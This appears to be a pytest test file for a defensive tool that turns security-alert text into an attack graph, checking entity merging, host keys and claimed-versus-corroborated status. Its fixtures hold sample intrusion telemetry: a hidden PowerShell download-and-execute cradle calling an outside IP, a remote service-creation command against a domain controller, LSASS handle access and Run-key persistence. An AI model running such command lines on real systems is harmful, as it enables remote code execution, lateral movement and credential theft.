"""The attack graph's data model: what it merges, and what it refuses to claim.

Every fixture below is a real field shape taken from the store, not an
idealised one. The corpus is 14,430 key/value text bodies and 61 JSON ones, so
both are exercised.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from app.services.alert_graph_assembly_service import (
    AlertEvidence,
    assemble,
)
from app.services.alert_graph_extraction_service import (
    CLAIMED,
    CORROBORATED,
    INFERRED,
    OBSERVED,
    PARSED,
    extract,
    host_key,
    read_fields,
    status_for,
)

NOW = datetime(2026, 8, 16, 9, 2, 11, tzinfo=timezone.utc)


def _text_body(**eventdata: str) -> str:
    """A body in the shape 14,430 of 15,203 stored alerts actually use."""
    lines = [
        "Alert: EXP-FIN-034 - something fired",
        "Rule: 100210",
        "Rule level: 12",
        "Agent: EXP-FIN-034 | 1634",
        "Computer: EXP-FIN-034.corp.local",
        "Event ID: 1",
    ]
    lines += [f"data.win.eventdata.{k}: {v}" for k, v in eventdata.items()]
    return "\n".join(lines)


def _evidence(body: str, *, run_id="r1", rule="100210", at=NOW, level=12, confirmed=()):
    return AlertEvidence(
        run_id=run_id, rule_id=rule, detection="d", event_time=at, rule_level=level,
        extracted=extract(body, rule_level=level, confirmed_techniques=confirmed),
    )


# --- status: the one rule that must never erode ----------------------------

def test_only_a_sensor_field_corroborates():
    assert status_for(OBSERVED) == CORROBORATED
    assert status_for(PARSED) == CLAIMED
    assert status_for(INFERRED) == CLAIMED


@pytest.mark.parametrize("basis", [None, "", "unknown", "likely", "high_confidence"])
def test_an_unrecognised_basis_is_a_claim(basis):
    """Never the optimistic reading. A graph is far more persuasive than a
    table — of 30,834 ATT&CK mappings in this estate 40 are confirmed — so an
    unmarked inference is more dangerous here, not less."""
    assert status_for(basis) == CLAIMED


def test_a_technique_a_rule_asserts_is_a_claim():
    body = _text_body(image=r"C:\Windows\System32\cmd.exe", processId="4")
    body += "\nMitre.Sub_technique.ID: T1059.001, T1106"
    out = extract(body)
    techniques = [e for e in out.entities if e.kind == "technique"]
    assert {t.label for t in techniques} == {"T1059.001", "T1106"}
    assert all(t.status == CLAIMED for t in techniques)


def test_a_technique_the_investigation_confirmed_is_corroborated():
    body = _text_body(image=r"C:\Windows\System32\cmd.exe", processId="4")
    body += "\nMitre.Sub_technique.ID: T1059.001, T1106"
    out = extract(body, confirmed_techniques=["T1059.001"])
    status = {e.label: e.status for e in out.entities if e.kind == "technique"}
    assert status == {"T1059.001": CORROBORATED, "T1106": CLAIMED}


# --- the delimiter rules, each one a measured failure ----------------------

def test_the_multi_value_separator_does_not_become_part_of_the_host():
    """One alert can aggregate several events and the text form joins their
    values with " | ": `Agent: EXP-4LWK334 | 1634`. Read whole, that is a
    machine called "EXP-4LWK334 | 1634" — a different machine from every other
    mention of the same host, which is the entity split this model exists to
    prevent."""
    fields = read_fields("Agent: EXP-4LWK334 | 1634\nRule level: 15 | 3")
    assert fields["agent.name"] == "EXP-4LWK334"
    assert fields["rule.level"] == "15"


def test_the_short_name_and_the_fqdn_are_one_host():
    """The same alert carries both spellings, so keying on the FQDN the brief
    asked for would draw one machine twice."""
    assert host_key("EXP-FIN-034") == host_key("EXP-FIN-034.corp.local")
    assert host_key("exp-fin-034.CORP.LOCAL") == "exp-fin-034"


def test_a_host_named_only_inside_a_unc_path_still_resolves():
    """`EXP-DC-01` appears nowhere in this estate except inside
    `\\\\EXP-DC-01\\ADMIN$`, and it has no FQDN at all."""
    assert host_key(r"\\EXP-DC-01\ADMIN$") == "exp-dc-01"


def test_an_agent_id_never_becomes_a_host():
    assert host_key("1634") is None


def test_only_technique_ids_come_out_of_the_mitre_triple():
    """The text form packs three indexed lists into one value: ids, then
    names, then tactics. Splitting the whole value on commas yields
    "Dynamic-link Library Injection" as a technique id."""
    body = (
        "MITRE: {0=T1055.001, 1=T1106} | {0=Dynamic-link Library Injection, "
        "1=Native API} | {0=Defense Evasion, 1=Privilege Escalation}"
    )
    assert read_fields(body)["rule.mitre.id"] == ["T1055.001", "T1106"]


def test_a_service_binary_survives_the_space_after_the_equals_sign():
    """`binpath=(\\S+)` against the stored string returns nothing, because the
    real command line is `binpath= C:\\Windows\\odsvc.exe`. The naive pattern
    finds no binary and the chain stops dead at the service node."""
    body = _text_body(
        image=r"C:\Users\jdoe\AppData\Local\Temp\ps.exe",
        commandLine=r'ps.exe \\EXP-DC-01 -u CORP\jdoe -s cmd.exe /c "sc create updsvc binpath= C:\Windows\odsvc.exe"',
        targetServer=r"\\EXP-DC-01\ADMIN$",
    )
    out = extract(body)
    services = [e for e in out.entities if e.kind == "service"]
    files = [e for e in out.entities if e.kind == "file"]
    assert [s.label for s in services] == ["updsvc"]
    assert "odsvc.exe" in {f.label for f in files}
    # And it belongs to the machine the command reached, not the one that typed
    # it: keyed locally, a domain controller's new service is filed under a
    # workstation.
    assert services[0].attrs["host"] == "exp-dc-01"


def test_a_dotted_path_is_matched_whole_not_by_suffix():
    """alert_field_service._DOTTED matches `[\\w.]*\\.{key}`, and switched on
    for every field at once it gave 11,374 alerts an `event_name` of "Account
    Manipulation, Valid Accounts" — a technique list read as an event name
    because some dotted path ends in `.name`. Keying on the whole path cannot
    do that."""
    fields = read_fields("some.other.image: C:\\decoy.exe\ndata.win.eventdata.image: C:\\real.exe")
    assert fields["data.win.eventdata.image"] == "C:\\real.exe"
    assert fields["some.other.image"] == "C:\\decoy.exe"


# --- what the extractor refuses to say -------------------------------------

def test_the_process_on_the_far_end_of_a_handle_does_not_run_as_the_caller():
    """`lsass.exe ran_as CORP\\jdoe` is a false statement about a real event:
    the alert's principal is whoever opened the handle."""
    body = _text_body(
        sourceImage=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
        sourceProcessId="7788",
        targetImage=r"C:\Windows\System32\lsass.exe",
        grantedAccess="0x1410",
        user=r"CORP\jdoe",
    )
    out = extract(body)
    lsass = next(e for e in out.entities if e.label == "lsass.exe")
    ran_as = [e for e in out.edges if e.kind == "ran_as"]
    assert all(e.source != lsass.merge_key for e in ran_as)
    handle = next(e for e in out.edges if e.kind == "opened_handle")
    assert handle.attrs["granted_access"] == "0x1410"


def test_pe_version_metadata_is_not_a_security_control():
    """`ed.product` occurs on 294 runs as a signed binary's version block
    (company/description/product/fileVersion). Keyed on it, every signed
    executable in the estate becomes a "security control" — a node true of
    everything, which can neither link nor rank."""
    body = _text_body(
        image=r"C:\Windows\System32\cmd.exe", processId="4",
        product="Microsoft® Windows® Operating System",
        description="Windows Command Processor",
        company="Microsoft Corporation",
    )
    out = extract(body)
    assert not [e for e in out.entities if e.kind == "security_control"]


def test_a_real_security_control_needs_a_feature_and_a_state():
    body = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        product="Windows Defender Antivirus",
        feature="Real-Time Protection",
        state="Disabled",
    )
    out = extract(body)
    control = next(e for e in out.entities if e.kind == "security_control")
    assert control.status == CORROBORATED
    assert [e.kind for e in out.edges if e.kind == "disabled"] == ["disabled"]


def test_a_url_in_a_command_line_is_a_claim_but_its_address_is_a_node():
    body = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120",
        commandLine=(
            'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient)'
            ".DownloadString('http://185.220.101.47/a')\""
        ),
    )
    out = extract(body)
    urls = [e for e in out.entities if e.kind == "url"]
    ips = [e for e in out.entities if e.kind == "ip"]
    assert [u.attrs["url"] for u in urls] == ["http://185.220.101.47/a"]
    assert [i.label for i in ips] == ["185.220.101.47"]
    assert all(e.status == CLAIMED for e in urls + ips)


# --- the assembler: the merges that are the whole point --------------------

def test_the_same_binary_named_three_ways_is_one_node():
    """Across case #1440 `odsync.exe` is the source of an LSASS handle with
    PID 7788, the unnamed parent of two other processes, and the data of a Run
    key. Four observations, one binary. Drawn as four nodes, persistence sits
    on one leaf and credential access on another, and the graph hides the only
    thing worth seeing."""
    with_pid = _text_body(
        sourceImage=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
        sourceProcessId="7788",
        targetImage=r"C:\Windows\System32\lsass.exe",
    )
    as_parent = _text_body(
        image=r"C:\Windows\System32\nltest.exe",
        parentImage=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
    )
    as_registry_data = _text_body(
        image=r"C:\Windows\System32\reg.exe", processId="7340",
        targetObject=r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync",
        details=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
    )
    graph = assemble([
        _evidence(with_pid, run_id="a", rule="100515"),
        _evidence(as_parent, run_id="b", rule="61017", at=NOW + timedelta(minutes=5)),
        _evidence(as_registry_data, run_id="c", rule="100311", at=NOW + timedelta(seconds=36)),
    ])
    odsync = [n for n in graph["nodes"] if "odsync.exe" in n["label"]]
    assert len(odsync) == 1, [n["label"] for n in graph["nodes"]]
    # The PID-bearing observation survives, so the node is the corroborated one.
    assert odsync[0]["attrs"]["pid"] == "7788"
    assert odsync[0]["status"] == CORROBORATED
    assert odsync[0]["absorbed"], "the node must say which observations it merged"
    # And it must admit that the unification itself was not observed.
    assert odsync[0]["attrs"]["merged_without_pid"] is True


def test_two_alerts_on_one_pid_are_two_witnesses_not_two_nodes():
    first = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120", parentImage=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        parentProcessId="5044",
    )
    second = _text_body(
        path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120", scriptBlockText="$e='JAB...';IEX(...)",
    )
    graph = assemble([
        _evidence(first, run_id="a", rule="100210"),
        _evidence(second, run_id="b", rule="92052", at=NOW + timedelta(seconds=3)),
    ])
    pwsh = [
        n for n in graph["nodes"]
        if n["kind"] == "process" and n["attrs"].get("pid") == "6120"
    ]
    assert len(pwsh) == 1
    assert {w["rule_id"] for w in pwsh[0]["witnesses"]} == {"100210", "92052"}
    assert pwsh[0]["witness_count"] == 2


def test_an_address_reached_two_ways_is_flagged_as_reused_infrastructure():
    """A stager URL at 09:02 and a C2 name resolving to the same address at
    09:19. That convergence is the finding a table cannot show, and on a
    60-node canvas nobody counts inbound edges."""
    stager = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120",
        commandLine="powershell -c \"DownloadString('http://185.220.101.47/a')\"",
    )
    beacon = _text_body(
        image=r"C:\Windows\odsvc.exe",
        destinationIp="185.220.101.47",
        destinationHostname="updates-cdn-sync.com",
        destinationPort="443",
    )
    graph = assemble([
        _evidence(stager, run_id="a", rule="100210"),
        _evidence(beacon, run_id="b", rule="100805", at=NOW + timedelta(minutes=17)),
    ])
    ips = [n for n in graph["nodes"] if n["kind"] == "ip"]
    assert len(ips) == 1
    assert ips[0]["attrs"]["reused_infrastructure"] is True
    assert len(ips[0]["attrs"]["reached_by"]) >= 2


# --- the inference guard ---------------------------------------------------

def test_an_orphan_process_gets_an_inferred_parent_marked_as_a_claim():
    """`reg.exe` wrote the Run key and its alert names no parent, so the link
    from the command interpreter to persistence is simply absent."""
    pwsh = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120",
    )
    reg = _text_body(
        image=r"C:\Windows\System32\reg.exe", processId="7340",
        targetObject=r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync",
    )
    graph = assemble([
        _evidence(pwsh, run_id="a", rule="100210"),
        _evidence(reg, run_id="b", rule="100311", at=NOW + timedelta(seconds=36)),
    ])
    inferred = [e for e in graph["edges"] if e["attrs"].get("inferred")]
    assert len(inferred) == 1
    assert inferred[0]["kind"] == "spawned"
    assert inferred[0]["status"] == CLAIMED
    assert inferred[0]["attrs"]["gap_seconds"] == 36
    assert "not the sensor's" in inferred[0]["attrs"]["why"]


def test_the_inference_never_contradicts_the_telemetry():
    """The first version of this drew `spawned odsync.exe -> lsass.exe`.
    LSASS was not spawned by anything here — it was *opened* — so the
    inference did not merely guess, it asserted the opposite of what the
    sensor said, on the edge a board would read as the credential-theft step.
    A node already reached by any edge is left alone."""
    handle = _text_body(
        sourceImage=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
        sourceProcessId="7788",
        targetImage=r"C:\Windows\System32\lsass.exe",
        grantedAccess="0x1410",
    )
    graph = assemble([_evidence(handle, run_id="a", rule="100515")])
    spawned_into_lsass = [
        e for e in graph["edges"]
        if e["kind"] == "spawned" and "lsass" in e["target"]
    ]
    assert not spawned_into_lsass


def test_a_distant_process_is_left_unparented_rather_than_guessed():
    """`odsvc.exe` beacons 4m15s after `ps.exe` runs and is a service on
    another machine, so a link between them would be fiction."""
    ps = _text_body(image=r"C:\Users\jdoe\AppData\Local\Temp\ps.exe", processId="9001")
    beacon = _text_body(image=r"C:\Windows\odsvc.exe", destinationIp="185.220.101.47")
    graph = assemble([
        _evidence(ps, run_id="a", rule="100710"),
        _evidence(beacon, run_id="b", rule="100805", at=NOW + timedelta(seconds=255)),
    ])
    assert not [e for e in graph["edges"] if e["attrs"].get("inferred")]


def test_a_process_whose_parent_the_sensor_reported_is_not_second_guessed():
    first = _text_body(image=r"C:\Windows\System32\cmd.exe", processId="100")
    second = _text_body(
        image=r"C:\Windows\System32\reg.exe", processId="200",
        parentImage=r"C:\Windows\explorer.exe", parentProcessId="300",
    )
    graph = assemble([
        _evidence(first, run_id="a"),
        _evidence(second, run_id="b", at=NOW + timedelta(seconds=10)),
    ])
    assert not [e for e in graph["edges"] if e["attrs"].get("inferred")]


# --- the JSON shape, which is 61 of 15,203 bodies --------------------------

def test_the_json_shape_reads_the_same_fields():
    body = (
        '{"rule":{"id":"100210","level":12,"mitre":{"id":["T1204.002"]}},'
        '"agent":{"name":"EXP-FIN-034"},'
        '"data":{"win":{"system":{"computer":"EXP-FIN-034.corp.local"},'
        '"eventdata":{"image":"C:\\\\Windows\\\\System32\\\\cmd.exe",'
        '"processId":"6120","user":"CORP\\\\jdoe"}}}}'
    )
    out = extract(body)
    kinds = {e.kind for e in out.entities}
    assert {"host", "account", "process", "technique"} <= kinds
    host = next(e for e in out.entities if e.kind == "host")
    assert host.label == "exp-fin-034"
    technique = next(e for e in out.entities if e.kind == "technique")
    assert technique.status == CLAIMED


def test_a_body_that_is_not_json_or_key_values_yields_nothing_rather_than_junk():
    """712 bodies are CEF or syslog. Nothing is better than a host called
    "<110>1"."""
    out = extract(
        "<110>1 2026-08-09T14:24:56.126Z 1cf1c42e1f05 Skyformation - "
        "5007553803360726235 - CEF:0|Skyformation|Cloud Apps Security|2.0.0"
    )
    assert not [e for e in out.entities if e.kind == "host"]
